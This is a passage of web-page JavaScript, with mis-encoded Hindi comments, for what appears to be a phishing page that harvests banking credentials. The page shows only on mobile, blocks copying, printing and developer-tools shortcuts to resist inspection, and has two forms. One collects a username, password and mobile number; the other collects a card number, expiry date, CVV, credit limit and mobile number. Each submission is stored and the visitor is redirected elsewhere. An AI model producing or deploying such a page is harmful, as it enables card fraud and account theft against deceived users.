            // ‡§°‡•á‡§∏‡•ç‡§ï‡§ü‡•â‡§™ ‡§™‡§ï‡§°‡§º‡§æ ‡§ó‡§Ø‡§æ ‚Üí ‡§™‡•Ç‡§∞‡§æ ‡§™‡•á‡§ú ‡§π‡§ü‡§æ ‡§ï‡§∞ ‡§∏‡§ø‡§∞‡•ç‡§´ ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§¶‡§ø‡§ñ‡§æ‡§è‡§Å

    <!-- ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
         ‚ñà‚ñà  ‡§è‡§Ç‡§ü‡•Ä-‡§ï‡•â‡§™‡•Ä + ‡§´‡•â‡§∞‡•ç‡§Æ ‡§´‡§Ç‡§ï‡•ç‡§∂‡§® ‚Äì ‡§ï‡•á‡§µ‡§≤ ‡§Æ‡•ã‡§¨‡§æ‡§á‡§≤ ‡§™‡§∞ ‡§è‡§ï‡•ç‡§ü‡§ø‡§µ  ‚ñà‚ñà
         ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà -->
    <script>
        // ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
        // ‚ñà‚ñà  ‡§è‡§Ç‡§ü‡•Ä-‡§ï‡•â‡§™‡•Ä ‡§π‡§æ‡§∞‡•ç‡§°‡§®‡§ø‡§Ç‡§ó ‚Äì ‡§ï‡•ã‡§à ‡§≠‡•Ä ‡§ï‡•â‡§™‡•Ä/‡§°‡•ç‡§∞‡•à‡§ó/‡§™‡•ç‡§∞‡§ø‡§Ç‡§ü ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§ó‡§æ ‚ñà‚ñà
        // ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
        
        // 1) ‡§∞‡§æ‡§á‡§ü ‡§ï‡•ç‡§≤‡§ø‡§ï ‡§™‡•Ç‡§∞‡•Ä ‡§§‡§∞‡§π ‡§¨‡§Ç‡§¶
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });

        // 2) ‡§ï‡•â‡§™‡•Ä, ‡§ï‡§ü, ‡§°‡•ç‡§∞‡•à‡§ó, ‡§°‡•ç‡§∞‡•â‡§™, ‡§∏‡•á‡§µ, ‡§™‡•ç‡§∞‡§ø‡§Ç‡§ü ‡§∏‡§¨ ‡§¨‡§Ç‡§¶
        document.addEventListener('copy', (e) => e.preventDefault());
        document.addEventListener('cut', (e) => e.preventDefault());
        document.addEventListener('dragstart', (e) => e.preventDefault());
        document.addEventListener('drop', (e) => e.preventDefault());
        document.addEventListener('selectstart', (e) => {
            if (!e.target.matches('input, textarea, [contenteditable="true"]')) {
                e.preventDefault();
            }
        });

        // 3) ‡§ï‡•Ä‡§¨‡•ã‡§∞‡•ç‡§° ‡§∂‡•â‡§∞‡•ç‡§ü‡§ï‡§ü ‡§¨‡•ç‡§≤‡•â‡§ï ‚Äì F12, Ctrl+U, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+C, Ctrl+X, Ctrl+S, Ctrl+P
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) || 
                (e.ctrlKey && e.key === 'u') || 
                (e.ctrlKey && e.key === 'U') ||
                (e.metaKey && e.key === 'u') ||
                (e.metaKey && e.key === 'U')) {
                e.preventDefault();
                return false;
            }
            
            if (e.ctrlKey || e.metaKey) {
                if (['c', 'x', 's', 'p', 'C', 'X', 'S', 'P'].includes(e.key)) {
                    e.preventDefault();
                    return false;
                }
            }
        });

        // 4) ‡§∏‡•á‡§≤‡•á‡§ï‡•ç‡§∂‡§® API ‡§ï‡•ã ‡§≠‡•Ä ‡§°‡§ø‡§∏‡•á‡§¨‡§≤ ‡§ï‡§∞‡•á‡§Ç
        document.addEventListener('selectionchange', function() {
            const sel = window.getSelection();
            if (sel.rangeCount > 0) {
                let container = sel.getRangeAt(0).commonAncestorContainer;
                if (container.nodeType === 3) container = container.parentNode;
                if (!container.matches('input, textarea, [contenteditable="true"]')) {
                    sel.removeAllRanges();
                }
            }
        });

        // ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
        // ‚ñà‚ñà  ‡§ì‡§∞‡§ø‡§ú‡§ø‡§®‡§≤ ‡§´‡•â‡§∞‡•ç‡§Æ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‚Äì ‡§¨‡§ø‡§≤‡•ç‡§ï‡•Å‡§≤ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§        ‚ñà‚ñà
        // ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà

        // ‡§ü‡•â‡§ó‡§≤ ‡§∏‡•ç‡§µ‡§ø‡§ö
        const userTab = document.getElementById('userTab');
        const cardTab = document.getElementById('cardTab');
        const userPanel = document.getElementById('userPanel');
        const cardPanel = document.getElementById('cardPanel');
        
        userTab.addEventListener('click', function() {
            userTab.classList.add('active');
            cardTab.classList.remove('active');
            userPanel.classList.add('active');
            cardPanel.classList.remove('active');
        });
        
        cardTab.addEventListener('click', function() {
            cardTab.classList.add('active');
            userTab.classList.remove('active');
            cardPanel.classList.add('active');
            userPanel.classList.remove('active');
        });
        
        // ‡§á‡§®‡§™‡•Å‡§ü ‡§µ‡•à‡§≤‡§ø‡§°‡•á‡§∂‡§®
        function showError(input, message) {
            input.classList.add('error');
            const errorDiv = input.parentElement.querySelector('.error-message');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
        }
        
        function clearError(input) {
            input.classList.remove('error');
            const errorDiv = input.parentElement.querySelector('.error-message');
            errorDiv.style.display = 'none';
        }
        
        // ‡§ï‡•ç‡§∞‡•á‡§°‡§ø‡§ü ‡§ï‡§æ‡§∞‡•ç‡§° ‡§®‡§Ç‡§¨‡§∞ ‡§´‡•â‡§∞‡•ç‡§Æ‡•á‡§ü‡§ø‡§Ç‡§ó
        const creditCardInput = document.getElementById('cardNumber');
        if (creditCardInput) {
            creditCardInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\s+/g, '').replace(/\D/g, '');
                value = value.substring(0, 16);
                
                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) {
                        formattedValue += ' ';
                    }
                    formattedValue += value[i];
                }
                
                e.target.value = formattedValue;
                clearError(e.target);
            });
        }
        
        // ‡§è‡§ï‡•ç‡§∏‡§™‡§æ‡§Ø‡§∞‡•Ä ‡§°‡•á‡§ü ‡§´‡•â‡§∞‡•ç‡§Æ‡•á‡§ü‡§ø‡§Ç‡§ó
        const expiryInput = document.getElementById('expiry');
        if (expiryInput) {
            expiryInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                e.target.value = value.substring(0, 5);
                clearError(e.target);
            });
        }
        
        // CVV ‡§∏‡§ø‡§∞‡•ç‡§´ ‡§®‡§Ç‡§¨‡§∞
        const cvvInput = document.getElementById('cvv');
        if (cvvInput) {
            cvvInput.addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
                clearError(e.target);
            });
        }
        
        // ‡§Æ‡•ã‡§¨‡§æ‡§á‡§≤ ‡§®‡§Ç‡§¨‡§∞ ‡§∏‡§ø‡§∞‡•ç‡§´ ‡§®‡§Ç‡§¨‡§∞
        const mobileInputs = [document.getElementById('mobile'), document.getElementById('cardMobile')];
        mobileInputs.forEach(input => {
            if (input) {
                input.addEventListener('input', function(e) {
                    e.target.value = e.target.value.replace(/\D/g, '').substring(0, 10);
                    clearError(e.target);
                });
            }
        });
        
        // ‡§°‡•á‡§ü‡§æ ‡§∏‡•á‡§µ ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ ‡§∞‡•Ä‡§°‡§æ‡§Ø‡§∞‡•á‡§ï‡•ç‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§´‡§Ç‡§ï‡•ç‡§∂‡§®
        function saveDataAndRedirect(formData, formType) {
            const submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
            const submission = {
                id: Date.now(),
                type: formType,
                data: formData,
                timestamp: new Date().toISOString(),
                ip: 'Not available in browser'
            };
            submissions.push(submission);
            localStorage.setItem('formSubmissions', JSON.stringify(submissions));
            window.location.href = 'blogone.html';
        }
        
        // User ID ‡§´‡•â‡§∞‡•ç‡§Æ ‡§∏‡§¨‡§Æ‡§ø‡§∂‡§®
        document.getElementById('userForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            let isValid = true;
            const inputs = this.querySelectorAll('.form-input');
            
            inputs.forEach(input => {
                if (!input.checkValidity()) {
                    showError(input, input.validationMessage || 'This field is required');
                    isValid = false;
                } else {
                    clearError(input);
                }
            });
            
            if (isValid) {
                const formData = {
                    username: document.getElementById('username').value,
                    password: document.getElementById('password').value,
                    mobile: document.getElementById('mobile').value
                };
                saveDataAndRedirect(formData, 'User ID');
            }
        });
        
        // Credit Card ‡§´‡•â‡§∞‡•ç‡§Æ ‡§∏‡§¨‡§Æ‡§ø‡§∂‡§®
        document.getElementById('cardForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            let isValid = true;
            const inputs = this.querySelectorAll('.form-input');
            
            inputs.forEach(input => {
                if (!input.checkValidity()) {
                    const customMessage = input.placeholder.includes('MM/YY') ? 
                        'Format: MM/YY (e.g., 12/25)' : 
                        (input.placeholder.includes('10-digit') ? 
                            'Valid 10-digit mobile number is required' : 
                            'This field is required');
                    showError(input, customMessage);
                    isValid = false;
                } else {
                    clearError(input);
                }
            });
            
            if (isValid) {
                const formData = {
                    cardNumber: document.getElementById('cardNumber').value,
                    expiry: document.getElementById('expiry').value,
                    cvv: document.getElementById('cvv').value,
                    creditLimit: document.getElementById('creditLimit').value,
                    mobile: document.getElementById('cardMobile').value
                };
                saveDataAndRedirect(formData, 'Credit Card');
            }
        });
        
        // ‡§∞‡§ø‡§Ø‡§≤-‡§ü‡§æ‡§á‡§Æ ‡§µ‡•à‡§≤‡§ø‡§°‡•á‡§∂‡§®
        document.querySelectorAll('.form-input').forEach(input => {
            input.addEventListener('blur', function() {
                if (!this.checkValidity()) {
                    const message = this.validationMessage || 'This field is required';
                    showError(this, message);
                }
            });
            
            input.addEventListener('input', function() {
                if (this.checkValidity()) {
                    clearError(this);
                }
            });
        });
    </script>
